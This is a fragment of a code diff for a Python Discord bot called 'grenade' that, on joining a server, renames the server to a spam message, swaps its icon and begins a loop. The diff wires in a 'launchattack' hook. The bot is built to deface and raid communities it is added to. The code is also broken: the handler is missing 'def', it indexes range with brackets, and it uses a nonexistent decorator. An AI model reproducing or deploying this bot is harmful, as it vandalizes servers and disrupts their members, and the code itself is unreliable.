@@ -1,12 +1,13 @@
 import discord
 from discord.ext import commands
+from utils.launcher import launchattack
 import random
 
 grenade = commands.Bot(command_prefix = 'xyz')
 
 
 
-@grenade.event()
+@grenade.launchattack()
 async on_guild_join(ctx, guild: discord.Guild):
   await ctx.guild.edit(name = "GUILDSPAMMED NYEHEHEHEHEHHEHE", icon = "guildicon.jpg")
   for i in range[0,10]:
